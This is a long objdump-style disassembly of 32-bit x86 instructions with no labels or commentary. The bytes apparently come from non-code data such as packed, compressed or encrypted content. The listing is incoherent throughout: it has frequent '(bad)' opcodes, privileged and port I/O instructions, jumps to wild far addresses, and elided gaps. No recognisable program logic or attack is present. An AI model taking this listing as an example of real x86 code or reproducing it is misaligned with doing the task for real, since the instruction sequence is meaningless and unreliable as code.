  42069a:	xlat   BYTE PTR ds:[ebx]
  42069b:	sub    DWORD PTR [ebp+0x265bde54],edx
  4206a1:	pmaddwd mm0,QWORD PTR [ecx]
  4206a4:	jne    0x42071f
  4206a6:	pop    ebx
  4206a7:	and    esp,DWORD PTR [ebx-0x2abf0587]
  4206ad:	mov    dl,ah
  4206af:	xchg   ebx,eax
  4206b0:	pmaxsw mm5,mm7
  4206b3:	adc    ebp,DWORD PTR ds:[ecx-0x72d5a2ea]
  4206ba:	lods   eax,DWORD PTR gs:[esi]
  4206bc:	push   es
  4206bd:	(bad)  
  4206be:	cmp    al,0x49
  4206c0:	pop    eax
  4206c1:	ret    0xb4c8
  4206c4:	and    eax,0x35a6e2a
  4206c9:	mov    ds:0xf8fe1f4d,al
  4206ce:	stc    
  4206cf:	aam    0xbb
  4206d1:	dec    edi
  4206d2:	out    dx,al
  4206d3:	enter  0x79fc,0xe2
  4206d7:	add    al,0xaf
  4206d9:	jge    0x42074a
  4206db:	adc    edx,esi
  4206dd:	int    0xeb
  4206df:	pop    ss
  4206e0:	jmp    0x4206cc
  4206e2:	mov    dl,0xeb
  4206e4:	mov    esp,0xa8ada5b9
  4206e9:	push   es
  4206ea:	jle    0x420739
  4206ec:	lods   eax,DWORD PTR ds:[esi]
  4206ed:	fwait
  4206ee:	cmp    eax,0x4853876f
  4206f3:	hlt    
  4206f4:	(bad)
  4206f9:	cmp    esp,0xffffffd6
  4206fc:	mov    esp,0xa777e18f
  420701:	or     bh,BYTE PTR [ecx]
  420703:	std    
  420704:	xor    esi,edi
  420706:	retf   
  420707:	sub    BYTE PTR [ecx],dl
  420709:	test   al,0xc9
  42070b:	mov    eax,ds:0xde881e6a
  420710:	cmp    eax,0x97bf3d2f
  420715:	pop    ebx
  420716:	mov    esp,0x4e9d9945
  42071c:	sahf   
  42071d:	jmp    0x4206f5
  42071f:	push   0x19
  420721:	add    eax,0xd6638ef2
  420726:	jae    0x4206d1
  420728:	mov    esi,0x862345a6
  42072d:	jbe    0x42078c
  42072f:	mov    eax,esi
  420731:	call   0xfc12f3e4
  420736:	int    0x2d
  420738:	ds fxch st(3)
  42073b:	scas   eax,DWORD PTR es:[edi]
  42073c:	mov    ebp,0xbbe603e2
  420741:	dec    ebp
  420742:	(bad)  [esi]
  420744:	xor    eax,0x2534a6f1
  420749:	and    DWORD PTR [ebp+0x468c731d],ecx
  42074f:	sub    esi,ecx
  420751:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420752:	push   ebx
  420753:	xor    edi,DWORD PTR [esi]
  420755:	fistp  DWORD PTR [eax]
  420757:	mov    ds:0xb45a2197,al
  42075c:	fistp  DWORD PTR [ecx+0x39]
  42075f:	dec    ebx
  420760:	and    ah,ah
  420762:	sti    
  420763:	test   eax,0xec9431ea
  420768:	or     BYTE PTR [esi+0x17],cl
  42076b:	cmp    al,0x98
  42076d:	push   ds
  42076e:	push   ss
  42076f:	int    0x78
  420771:	aaa    
  420772:	les    edx,FWORD PTR [esi-0x60]
  420775:	adc    al,0x42
  420777:	pop    ss
  420778:	or     DWORD PTR [edi+ecx*8],edx
  42077b:	aam    0x5a
  42077d:	(bad)  
  42077e:	rcr    BYTE PTR es:[ecx-0x232ad4fb],0xa6
  420786:	add    cl,BYTE PTR [esi-0x769e657b]
  42078c:	mov    ds:0x748beed8,al
  420791:	loopne 0x420778
  420793:	or     ecx,DWORD PTR [ebp-0x59]
  420796:	jno    0x420754
  420798:	sbb    al,0x53
  42079a:	fwait
  42079b:	test   al,0x6
  42079d:	cwde   
  42079e:	popa   
  42079f:	push   edx
  4207a0:	dec    ebx
  4207a1:	rcl    BYTE PTR [edx],cl
  4207a3:	sub    DWORD PTR [ebp+0x68984aab],eax
  4207a9:	jg     0x420804
  4207ab:	pop    ss
  4207ac:	imul   esp,DWORD PTR [edx-0x5a],0xff069ca6
  4207b3:	ins    BYTE PTR es:[edi],dx
  4207b4:	sahf   
  4207b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4207b6:	xchg   ebx,eax
  4207b7:	and    eax,DWORD PTR [eax-0x42]
  4207ba:	pop    ecx
  4207bb:	jo     0x420750
  4207bd:	push   ds
  4207be:	ds inc esi
  4207c0:	(bad)  
  4207c1:	std    
  4207c2:	call   0x376f:0x36e9328
  4207c9:	jmp    0x1f34567e
  4207ce:	in     al,dx
  4207cf:	or     esp,DWORD PTR [eax]
  4207d1:	fs loope 0x4207eb
  4207d4:	inc    edx
  4207d5:	push   0xc107a302
  4207da:	idiv   BYTE PTR [esi-0x2e]
  4207dd:	or     eax,0x2fd11913
  4207e2:	lods   eax,DWORD PTR ds:[esi]
  4207e3:	and    BYTE PTR [esi],0xc6
  4207e6:	outs   dx,BYTE PTR ds:[esi]
  4207e7:	sti    
  4207e8:	call   edx
  4207ea:	enter  0xf7d6,0x2a
  4207ee:	push   0x17
  4207f0:	pop    ebp
  4207f1:	inc    eax
  4207f2:	mul    BYTE PTR [ecx+0xfea25ff]
  4207f8:	pusha  
  4207f9:	and    ch,BYTE PTR [ebp-0x30ac380e]
  4207ff:	lahf   
  420800:	xchg   eax,ebp
  420802:	adc    esp,DWORD PTR [ebp-0x158c11ce]
  420808:	iret   
  420809:	sahf   
  42080a:	jno    0x4207d8
  42080c:	add    ebx,DWORD PTR [eax+0x275a]
	...
  42081a:	ja     0x420868
  42081c:	idiv   dh
  42081e:	(bad)  
  42081f:	(bad)  
  420820:	jg     0x4207ef
  420822:	mul    BYTE PTR [ebx+0x7bbc2ffd]
  420828:	mov    al,ds:0x18506a3
  42082d:	add    dh,bh
  42082f:	add    DWORD PTR [eax],eax
  420831:	add    BYTE PTR [eax-0x2f4e538d],ah
  420837:	jne    0x4207c1
  420839:	xchg   ebx,eax
  42083a:	ss sbb al,0xbe
  42083d:	add    al,0x85
  42083f:	jns    0x42089b
  420841:	cmc    
  420842:	push   es
  420843:	mov    BYTE PTR [esi+ecx*8+0x3add32f0],cl
  42084a:	lahf   
  42084b:	fisttp WORD PTR [edx+0x7e]
  42084e:	adc    edx,ebp
  420850:	adc    al,0x7b
  420852:	mov    ah,0x9a
  420854:	clc    
  420855:	pop    es
  420856:	pop    ebp
  420857:	pop    edx
  420858:	in     al,0x1f
  42085a:	nop
  42085b:	sbb    BYTE PTR [edi-0x3debb745],dl
  420861:	add    DWORD PTR [ebx-0x7a],esp
  420864:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420865:	xor    DWORD PTR [edx+0x3b],0x74
  420869:	mov    eax,0xe567b0c9
  42086e:	rol    DWORD PTR [esi+0x7e],1
  420871:	ins    BYTE PTR es:[edi],dx
  420872:	shr    DWORD PTR [edi-0x2a4f9897],0xfd
  420879:	pop    ss
  42087a:	sar    DWORD PTR [eax+ebx*4-0x6ba30b5c],1
  420881:	aas    
  420882:	pushf  
  420883:	pop    edi
  420884:	sbb    DWORD PTR [eax],edi
  420886:	das    
  420887:	jno    0x4208d2
  420889:	(bad)  
  42088a:	sbb    bh,BYTE PTR [edx]
  42088c:	jnp    0x4208f2
  42088e:	ret    0x3104
  420891:	pop    ds
  420892:	xor    eax,0x86d0163b
  420897:	mov    BYTE PTR [ebp+ecx*4-0x1a2bf07b],dh
  42089e:	or     DWORD PTR [edx],0xb42745aa
  4208a4:	adc    eax,0xd4211a5c
  4208a9:	dec    ebx
  4208aa:	pushf  
  4208ab:	push   es
  4208ac:	cwde   
  4208ad:	bnd jl 0x4208f7
  4208b0:	in     eax,0x33
  4208b2:	stos   BYTE PTR es:[edi],al
  4208b3:	not    DWORD PTR [ebx]
  4208b5:	out    dx,al
  4208b6:	jg     0x420908
  4208b8:	loope  0x420896
  4208ba:	mov    ebx,0x3928aaba
  4208bf:	pop    ecx
  4208c0:	pop    ebp
  4208c1:	jne    0x42087a
  4208c3:	xor    dl,BYTE PTR [esi-0x57c8b7ed]
  4208c9:	pop    ebp
  4208ca:	inc    ecx
  4208cb:	mov    DWORD PTR [edi+ecx*1-0x1e],edi
  4208cf:	dec    esp
  4208d0:	jo     0x420933
  4208d2:	ror    BYTE PTR [edi],0x7d
  4208d5:	sahf   
  4208d6:	(bad)  
  4208d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4208d8:	jb     0x420901
  4208da:	cld    
  4208db:	cs dec edi
  4208dd:	or     BYTE PTR [esi+0x5a],bl
  4208e0:	unpckhps xmm0,xmm4
  4208e3:	cmp    DWORD PTR [ecx+ebp*2+0xb2c1ad1],eax
  4208ea:	rdpmc  
  4208ec:	push   ss
  4208ed:	jb     0x42089e
  4208ef:	lds    edx,FWORD PTR [ebx-0x36]
  4208f2:	ja     0x42093e
  4208f4:	shr    dl,0x1a
  4208f7:	in     al,dx
  4208f8:	bound  ecx,QWORD PTR [esi]
  4208fa:	push   cs
  4208fb:	fisubr WORD PTR [edi+ebx*4+0x7c07042c]
  420902:	add    DWORD PTR ds:0x4d170c71,esi
  420908:	test   BYTE PTR [eax],dl
  42090a:	sub    BYTE PTR [esi-0x3fd394ff],bl
  420910:	mov    dh,0x78
  420912:	imul   esp,DWORD PTR [ebp+0x2770ea88],0x7b
  420919:	movhps xmm2,QWORD PTR [eax+0x1d]
  42091d:	jg     0x420985
  42091f:	lods   eax,DWORD PTR ds:[esi]
  420920:	cdq    
  420921:	dec    ebx
  420922:	popf   
  420923:	mov    ds:0x5143cc9c,al
  420928:	shr    BYTE PTR [edx],1
  42092a:	cwde   
  42092b:	test   DWORD PTR [edi-0x824b35e],0xaa40fc8f
  420935:	xlat   BYTE PTR ds:[ebx]
  420936:	add    BYTE PTR [esi],bl
  420938:	pop    ecx
  420939:	push   0xffffffdf
  42093b:	mov    esi,0x2cad12d4
  420940:	mov    bh,0x3e
  420942:	pop    es
  420943:	jge    0x420952
  420945:	fmul   st,st(7)
  420947:	cmc    
  420948:	push   ecx
  420949:	push   edi
  42094a:	mov    edx,0x1216858b
  42094f:	or     DWORD PTR [edi+edi*8],edi
  420952:	icebp  
  420953:	test   DWORD PTR [ebp-0x30036bdb],0x85b01350
  42095d:	mov    es,WORD PTR [eax]
  42095f:	test   al,0x11
  420961:	ss jbe 0x42091c
  420964:	ret    0x330a
  420967:	popa   
  420968:	fist   WORD PTR [ecx+0x366346c9]
  42096e:	loope  0x4209a5
  420970:	scas   al,BYTE PTR es:[edi]
  420971:	pop    esi
  420972:	ror    ch,0x8a
  420975:	cli    
  420976:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420977:	inc    eax
  420978:	popa   
  420979:	cdq    
  42097a:	daa    
  42097b:	retf   
  42097c:	pop    ds
  42097d:	call   0x6c8f5654
  420982:	add    bh,BYTE PTR ds:0x1195c836
  420988:	push   cs
  420989:	retf   
  42098a:	in     eax,dx
  42098b:	mov    ecx,0xa8573065
  420990:	sbb    eax,0x20499427
  420995:	xor    dl,ah
  420997:	sub    BYTE PTR [eax-0x43],ch
  42099a:	ins    BYTE PTR es:[edi],dx
  42099b:	out    0xf6,eax
  42099d:	jbe    0x420a0e
  42099f:	push   ss
  4209a0:	sysret 
  4209a2:	inc    BYTE PTR [ebp+ebx*4+0x67ec6c2d]
  4209a9:	pop    esp
  4209aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4209ab:	or     ecx,DWORD PTR [eax-0x64]
  4209ae:	cwde   
  4209af:	xor    DWORD PTR [ecx+0x62],0xf2ef1e64
  4209b6:	pop    ebx
  4209b7:	pop    es
  4209b8:	loop   0x420a08
  4209ba:	cmp    BYTE PTR [esi+0x443763e9],bh
  4209c0:	cmp    BYTE PTR [edx],0xa1
  4209c3:	nop
  4209c4:	push   0xffffffeb
  4209c6:	(bad)  
  4209c7:	or     eax,0xe6b9b05b
  4209cc:	sub    edi,ecx
  4209ce:	pop    edi
  4209cf:	aad    0xbf
  4209d1:	mov    esi,0x795cd432
  4209d6:	jne    0xd770f58b
  4209dc:	sub    esp,DWORD PTR [ecx+0x48dd30d0]
  4209e2:	xor    eax,esp
  4209e4:	inc    edi
  4209e5:	xchg   esp,eax
  4209e6:	imul   ebp,ebx,0x21
  4209e9:	jmp    0x420a3a
  4209eb:	fisttp WORD PTR [eax-0x4246e454]
  4209f1:	ret    0xc989
  4209f4:	mov    esp,0x29680d75
  4209f9:	aam    0xa5
  4209fb:	leave  
  4209fc:	mov    ecx,DWORD PTR [ebp+0x55]
  4209ff:	mov    ah,0x5
  420a01:	lods   eax,DWORD PTR ds:[esi]
  420a02:	mov    cl,0x93
  420a04:	mov    edx,0x36cf1583
  420a09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a0a:	and    al,0x24
  420a0c:	mov    ecx,0xd54c56a1
  420a11:	loope  0x420a34
  420a13:	mov    esp,0xfe247fde
  420a18:	pop    es
  420a19:	mov    ecx,0xb6f4ec2f
  420a1e:	out    dx,al
  420a1f:	arpl   WORD PTR [eax],di
  420a21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420a22:	js     0x4209a5
  420a24:	adc    BYTE PTR [edi+0x3d43ce2],ch
  420a2a:	cli    
  420a2b:	jle    0x420a91
  420a2d:	mov    esi,0xe1d4
	...
  420a3a:	pop    es
  420a3b:	sbb    cl,BYTE PTR [ecx-0x686462e6]
  420a41:	pop    ds
  420a42:	(bad)  
  420a44:	std    
  420a45:	jg     0x420a59
  420a47:	sti    
  420a48:	mov    edx,0x187045b
  420a4d:	add    dh,bh
  420a4f:	add    DWORD PTR [eax],eax
  420a51:	add    bh,ah
  420a53:	xchg   esi,ebx
  420a55:	jbe    0x420ad0
  420a57:	into   
  420a58:	cld    
  420a59:	and    al,0xd6
  420a5b:	mov    ecx,0xf2774041
  420a60:	push   esp
  420a61:	sub    eax,eax
  420a63:	push   ss
  420a64:	cwde   
  420a65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420a66:	pop    DWORD PTR [ecx+ebp*1]
  420a69:	mov    eax,0xc58181a3
  420a6e:	mov    ds:0x5e4adf9a,al
  420a73:	ret    
  420a74:	hlt    
  420a75:	sbb    eax,0x7d616689
  420a7a:	aaa    
  420a7b:	cmp    ch,BYTE PTR [edx+0x3e]
  420a7e:	xor    ecx,esi
  420a80:	shl    DWORD PTR [esp+edi*1+0x7741a6ee],cl
  420a87:	test   al,0xe2
  420a89:	mov    ch,0x98
  420a8b:	loop   0x420a67
  420a8d:	mov    ebp,0xc792932b
  420a92:	mov    eax,ds:0xa54a09e
  420a97:	xchg   edx,eax
  420a98:	ins    BYTE PTR es:[edi],dx
  420a99:	adc    esp,DWORD PTR [edi+0x57]
  420a9c:	xor    bh,BYTE PTR [ebp+0x5d086ab]
  420aa2:	jmp    0xf356bbd3
  420aa7:	call   0x83eb:0x1bdbea8f
  420aae:	hlt    
  420aaf:	bound  ebp,QWORD PTR [edx+0x4480f44a]
  420ab5:	call   0x262c6b33
  420aba:	mov    edi,DWORD PTR [edi+0x57dd24ef]
  420ac0:	mov    ebx,0x6a84d9aa
  420ac5:	loop   0x420af4
  420ac7:	inc    eax
  420ac8:	sbb    ch,BYTE PTR [edi]
  420aca:	cmp    BYTE PTR [eax+0x707c35ee],dl
  420ad0:	ins    DWORD PTR es:[edi],dx
  420ad1:	mov    eax,ds:0xd44b8344
  420ad6:	add    al,0xbe
  420ad8:	pop    ecx
  420ad9:	mov    ebx,0x6e8cac59
  420ade:	scas   eax,DWORD PTR es:[edi]
  420adf:	(bad)  
  420ae0:	jno    0x420a90
  420ae2:	xor    DWORD PTR [eax-0x1],eax
  420ae5:	pop    esp
  420ae6:	addr16 cmp edi,esi
  420ae9:	mov    esi,ds
  420aeb:	mov    ds:0xee4cd2ed,al
  420af0:	daa    
  420af1:	jae    0x420aff
  420af3:	inc    ecx
  420af4:	adc    al,0xbf
  420af6:	jmp    0xf628:0xbbfc06e2
  420afd:	xor    esi,DWORD PTR [ebx+0xb]
  420b00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b01:	test   al,0x7f
  420b03:	pop    edi
  420b04:	inc    esp
  420b05:	cdq    
  420b06:	stos   BYTE PTR es:[edi],al
  420b07:	hlt    
  420b08:	daa    
  420b09:	fwait
  420b0a:	sar    BYTE PTR [esi+eax*4-0x20a9d70c],cl
  420b11:	(bad)  
  420b12:	jle    0x420a97
  420b14:	jns    0x420a9a
  420b16:	arpl   ax,cx
  420b18:	xor    ah,BYTE PTR [edi+0x3f87b042]
  420b1e:	jb     0x420b6e
  420b20:	mov    esp,0xc9a790dc
  420b25:	aad    0x8c
  420b27:	jns    0x420b96
  420b29:	jne    0x420b85
  420b2b:	icebp  
  420b2c:	aaa    
  420b2d:	pop    ds
  420b2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b2f:	mov    al,ds:0xa88f0499
  420b34:	dec    eax
  420b35:	push   ecx
  420b36:	call   0x20f1df5f
  420b3b:	adc    eax,0x4d202344
  420b40:	xchg   edi,eax
  420b41:	ficom  DWORD PTR [ecx-0x397a3da5]
  420b47:	outs   dx,BYTE PTR ds:[esi]
  420b48:	or     bh,BYTE PTR [eax-0x65]
  420b4b:	mov    esp,0x3a4a7ec5
  420b50:	hlt    
  420b51:	adc    esp,DWORD PTR [ebx]
  420b53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b54:	jae    0x420ad8
  420b56:	imul   ebx,DWORD PTR [ebx],0x1402772
  420b5c:	add    edx,DWORD PTR [ebp-0xd5eec74]
  420b62:	lds    esp,FWORD PTR [ecx-0x76db3aeb]
  420b68:	lods   eax,DWORD PTR ds:[esi]
  420b69:	and    ebp,DWORD PTR [edx-0x2a]
  420b6c:	fidivr WORD PTR [eax-0x366a771c]
  420b72:	scas   eax,DWORD PTR es:[edi]
  420b73:	(bad)  
  420b74:	stc    
  420b75:	outs   dx,BYTE PTR ds:[esi]
  420b76:	inc    ebp
  420b77:	mov    al,BYTE PTR [eax]
  420b79:	sar    DWORD PTR [esi+eiz*2-0x29],cl
  420b7d:	dec    ebx
  420b7e:	std    
  420b7f:	push   ds
  420b80:	nop
  420b81:	das    
  420b82:	outs   dx,DWORD PTR ds:[esi]
  420b83:	ret    
  420b84:	pop    esi
  420b85:	and    al,0x8d
  420b87:	shl    DWORD PTR [ebp+ecx*8-0x54],cl
  420b8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b8c:	pop    ss
  420b8d:	aaa    
  420b8e:	sbb    ebp,0xffffff9a
  420b91:	sbb    bl,ch
  420b93:	inc    edi
  420b94:	dec    ebx
  420b95:	addr16 dec eax
  420b97:	mov    edi,0xa79c60ce
  420b9c:	adc    ebx,ebx
  420b9e:	lods   eax,DWORD PTR ds:[esi]
  420b9f:	ret    
  420ba0:	cs jne 0x420c0c
  420ba3:	mov    bl,BYTE PTR [ebx+0x3c]
  420ba6:	mov    cl,0xd1
  420ba8:	xor    BYTE PTR [esp+ebx*4-0xb],ah
  420bac:	test   BYTE PTR [ecx+0x52d112db],0x37
  420bb3:	mov    cl,0x1e
  420bb5:	je     0x420b63
  420bb7:	and    edi,DWORD PTR [esp+ebp*2-0x1b19387e]
  420bbe:	imul   edi,DWORD PTR [ebx],0x56
  420bc1:	sar    DWORD PTR [edi-0x5],1
  420bc4:	pop    esp
  420bc5:	mov    edx,0xfc99f685
  420bca:	cmp    ecx,DWORD PTR [ecx-0x5a201e7a]
  420bd0:	sub    edi,DWORD PTR [edi+esi*1]
  420bd3:	push   ebx
  420bd4:	aam    0xc8
  420bd6:	push   ss
  420bd7:	arpl   WORD PTR [ebx],sp
  420bd9:	lea    esp,[edi-0x1fcc8a1d]
  420bdf:	outs   dx,DWORD PTR ds:[esi]
  420be0:	xchg   ebp,eax
  420be1:	cmp    ah,BYTE PTR [ebp+0x67]
  420be4:	mov    bl,0xe9
  420be6:	mul    edi
  420be8:	nop
  420be9:	test   eax,0x75e11030
  420bee:	aad    0x28
  420bf0:	push   0xffffffb6
  420bf2:	(bad)  
  420bf3:	aam    0xe5
  420bf5:	adc    DWORD PTR ds:0xfb8b1375,esi
  420bfb:	jmp    0xd5fb7992
  420c00:	mov    bh,0x25
  420c02:	xchg   esi,eax
  420c03:	rdtsc  
  420c05:	jecxz  0x420b8e
  420c07:	pop    es
  420c08:	dec    esi
  420c09:	lock leave 
  420c0b:	retf   0x8478
  420c0e:	(bad)  
  420c0f:	(bad)  
  420c10:	div    DWORD PTR gs:[ebx]
  420c13:	cmp    ecx,DWORD PTR [eax]
  420c15:	aaa    
  420c16:	push   cs
  420c17:	imul   ebx,DWORD PTR [edi],0xcb5c8d61
  420c1d:	lahf   
  420c1e:	out    dx,al
  420c1f:	loope  0x420c32
  420c21:	sub    BYTE PTR [ecx],dh
  420c23:	test   DWORD PTR [ebp+0x421fe43b],esi
  420c29:	xchg   ebp,eax
  420c2a:	xor    edi,DWORD PTR [esi]
  420c2c:	sbb    DWORD PTR [ecx-0xe],edx
  420c2f:	(bad)  
  420c30:	out    dx,eax
  420c31:	sahf   
  420c32:	lods   eax,DWORD PTR ds:[esi]
  420c33:	pop    esi
  420c34:	mov    esi,0xacd33a3
  420c39:	fwait
  420c3a:	ret    
  420c3b:	int3   
  420c3c:	xchg   ebp,eax
  420c3d:	xchg   esp,eax
  420c3e:	and    dl,bl
  420c40:	jecxz  0x420c87
  420c42:	cmp    DWORD PTR [eax-0x4d],ecx
  420c45:	xchg   ecx,eax
  420c46:	ret    0xd871
  420c49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c4a:	ret    
  420c4b:	pop    ebp
  420c4c:	and    dh,bh
  420c4e:	and    bl,BYTE PTR [ecx]
	...
  420c58:	add    BYTE PTR [eax],al
  420c5a:	push   ds
  420c5b:	add    al,0xa7
  420c5d:	(bad)  
  420c5e:	mov    edi,0x7bdd7ee7
  420c63:	int    0x75
  420c65:	mov    WORD PTR [edi+0x2e2fccd],cs
  420c6b:	mov    DWORD PTR [ecx],eax
  420c6d:	add    dh,bh
  420c6f:	add    DWORD PTR [eax],eax
  420c71:	add    ah,dh
  420c73:	loopne 0x420c4d
  420c75:	pop    ss
  420c76:	sub    BYTE PTR [esi+0x3d],0x19
  420c7a:	mov    WORD PTR [esi],es
  420c7c:	or     ah,BYTE PTR [edi-0x146d59fb]
  420c82:	test   eax,0xa6a4806
  420c87:	xor    BYTE PTR [edx],bh
  420c89:	and    DWORD PTR [edi-0x6ab9788c],esi
  420c8f:	ins    BYTE PTR es:[edi],dx
  420c90:	xchg   al,cl
  420c92:	jo     0x420cf6
  420c94:	les    esi,FWORD PTR [ebp-0x1879ffb2]
  420c9a:	shl    dh,cl
  420c9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420c9d:	mov    eax,ds:0xc3437b7
  420ca2:	dec    esp
  420ca3:	or     edi,ecx
  420ca5:	and    al,0x61
  420ca7:	sub    eax,0x98d1ecd3
  420cac:	iret   
  420cad:	jmp    0x80db:0xc2f2d7b
  420cb4:	pop    ss
  420cb5:	cdq    
  420cb6:	pop    edx
  420cb7:	mov    esi,?
  420cb9:	cmp    eax,0x683a497b
  420cbe:	jne    0x420d12
  420cc0:	imul   esp,DWORD PTR [ebx-0xc],0xdd8976ef
  420cc7:	fnsave ds:[edx+0x1f69a0c]
  420cce:	dec    eax
  420ccf:	es scas eax,DWORD PTR es:[edi]
  420cd1:	mov    al,0x2a
  420cd3:	mov    ds:0x12dd3749,al
  420cd8:	daa    
  420cd9:	(bad)  
  420cdb:	icebp  
  420cdc:	cmc    
  420cdd:	(bad)  
  420cde:	push   ebp
  420cdf:	inc    ebp
  420ce0:	adc    al,0x59
  420ce2:	xchg   ebx,eax
  420ce3:	jae    0x420ca9
  420ce5:	inc    ebp
  420ce6:	iret   
  420ce7:	ja     0x420d38
  420ce9:	jne    0x420c6e
  420ceb:	mov    dh,0x13
  420ced:	retf   0x5918
  420cf0:	repnz fadd DWORD PTR [edx]
  420cf3:	outs   dx,DWORD PTR ds:[esi]
  420cf4:	repnz or BYTE PTR [edi-0x22],dh
  420cf8:	sar    BYTE PTR [esi],cl
  420cfa:	mov    DWORD PTR [ecx],edx
  420cfc:	rcl    DWORD PTR [eax-0x9e75eda],0xb8
  420d03:	mov    DWORD PTR [eax],ecx
  420d05:	adc    eax,eax
  420d07:	jg     0x420d31
  420d09:	ret    0x22f6
  420d0c:	inc    esi
  420d0d:	cmp    eax,0xcf5cb82a
  420d12:	mov    esi,0xe7d551df
  420d17:	dec    DWORD PTR ds:0x9ca21ba8
  420d1d:	imul   ebp,DWORD PTR [ebx],0x24aaa29f
  420d23:	xchg   BYTE PTR [ebx-0x355ee064],ch
  420d29:	push   0x153000b0
  420d2e:	cmp    BYTE PTR [ecx+esi*4-0x76f82cdc],dl
  420d35:	out    dx,al
  420d36:	sub    DWORD PTR [edi-0x2f],ebp
  420d39:	aam    0x85
  420d3b:	test   DWORD PTR [ecx],ebx
  420d3d:	(bad)  
  420d3e:	outs   dx,DWORD PTR ds:[esi]
  420d3f:	or     eax,0xd8639b7d
  420d44:	jnp    0x420ccc
  420d46:	sub    dh,BYTE PTR [esi-0xfa9fce]
  420d4c:	mov    ecx,0xf01af3c
  420d51:	xchg   ebx,eax
  420d52:	mov    BYTE PTR ds:0x881a8d89,ch
  420d58:	mov    dl,0xd7
  420d5a:	xchg   edi,eax
  420d5b:	fnsave [ecx-0x53]
  420d5e:	lea    esi,[edi+0x64e65483]
  420d64:	ret    0xbe71
  420d67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420d68:	and    al,0x88
  420d6a:	adc    BYTE PTR [edx],0x8
  420d6d:	adc    al,0x10
  420d6f:	mov    esp,0xb56abcc4
  420d74:	pop    esi
  420d75:	rcr    ch,1
  420d77:	push   cs
  420d78:	outs   dx,DWORD PTR ds:[esi]
  420d79:	lock xor eax,0x1a47f168
  420d7f:	mov    esi,0x7f64bd82
  420d84:	call   0xb592:0xe9f2a5c
  420d8b:	pushf  
  420d8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d8d:	cmp    eax,0xf869d4bb
  420d92:	ror    BYTE PTR [eax+0x26],0xa2
  420d96:	xor    bh,ah
  420d98:	cld    
  420d99:	or     BYTE PTR [esi-0x67],ah
  420d9c:	mov    dh,0xe8
  420d9e:	push   es
  420d9f:	cmp    BYTE PTR [ebx+0x2d],ah
  420da2:	dec    ebx
  420da3:	hlt    
  420da4:	or     BYTE PTR [esi+eiz*4+0x5f],ah
  420da8:	es push 0xec1b00d8
  420dae:	pop    ss
  420daf:	ror    DWORD PTR [edi+0x1ebb23d7],1
  420db5:	dec    ebp
  420db6:	mov    al,0xcc
  420db8:	bndldx (bad),[ecx+0x41523be5]
  420dbf:	cmp    eax,0xc00969fc
  420dc4:	mov    ecx,0xd8b32f7
  420dc9:	xchg   ebp,eax
  420dca:	cmp    al,0xc4
  420dcc:	imul   edx,DWORD PTR [esi+ebx*1+0x65],0xfffffff1
  420dd1:	jne    0x420de9
  420dd3:	ja     0x420d9e
  420dd5:	cmp    ecx,DWORD PTR [ebp-0x72]
  420dd8:	dec    ebx
  420dd9:	in     al,dx
  420dda:	ja     0x420dc6
  420ddc:	(bad)  
  420ddd:	std    
  420dde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ddf:	jo     0x420dd7
  420de1:	mov    BYTE PTR [edi+0x52e8e6a0],ah
  420de7:	sub    BYTE PTR [edi+eiz*8-0x608ea5fd],0xb7
  420def:	add    cl,BYTE PTR [edx]
  420df1:	mov    ebx,DWORD PTR [ebx-0xb]
  420df4:	push   es
  420df5:	out    dx,eax
  420df6:	and    BYTE PTR [ecx-0x5b],dh
  420df9:	mov    eax,ds:0x7eed03c4
  420dfe:	dec    eax
  420dff:	stc    
  420e00:	icebp  
  420e01:	jmp    0x420ded
  420e03:	inc    eax
  420e04:	xor    dl,BYTE PTR [eax+eiz*4]
  420e07:	and    al,0xb8
  420e09:	jmp    0x420da0
  420e0b:	fidivr DWORD PTR ds:0x319583fa
  420e11:	popf   
  420e12:	ins    BYTE PTR es:[edi],dx
  420e13:	lods   al,BYTE PTR ds:[esi]
  420e14:	or     DWORD PTR [eax-0x2be6e0b6],0x58
  420e1b:	push   ds
  420e1c:	jbe    0x420dd0
  420e1e:	repz dec esp
  420e20:	xchg   edi,eax
  420e21:	inc    eax
  420e22:	jle    0x420e03
  420e24:	mov    eax,ds:0x3f93cf7c
  420e29:	ret    0x8247
  420e2c:	jo     0x420db3
  420e2e:	push   esp
  420e2f:	add    ch,0x28
  420e32:	mov    ecx,0x1414f7d3
  420e37:	jnp    0x420dc1
  420e39:	push   eax
  420e3a:	nop
  420e3b:	xchg   esi,eax
  420e3c:	mov    cl,0x65
  420e3e:	retf   0x573a
  420e41:	in     al,0xb2
  420e43:	xchg   edi,eax
  420e44:	call   0xe569:0xffe3c214
  420e4b:	ds (bad) 
  420e4d:	lds    eax,FWORD PTR [ecx]
  420e4f:	xchg   esi,eax
  420e50:	pop    ebp
  420e51:	adc    eax,0x31bce2c4
  420e56:	mov    ds:0xf991d8f1,eax
  420e5b:	cdq    
  420e5c:	arpl   bx,cx
  420e5e:	repnz fwait
  420e60:	push   es
  420e61:	mov    ah,0x90
  420e63:	and    bh,dh
  420e65:	mov    ebp,0x4c4b93b0
  420e6a:	mov    ah,0x53
  420e6c:	lods   al,BYTE PTR ds:[esi]
  420e6d:	(bad)  
  420e6e:	(bad)  
	...
  420e78:	add    BYTE PTR [eax],al
  420e7a:	js     0x420e05
  420e7c:	hlt    
  420e7d:	mov    al,0xf5
  420e7f:	std    
  420e80:	jl     0x420e4b
  420e82:	xor    dl,0x39
  420e85:	jg     0x420e86
  420e87:	push   esp
  420e88:	push   ecx
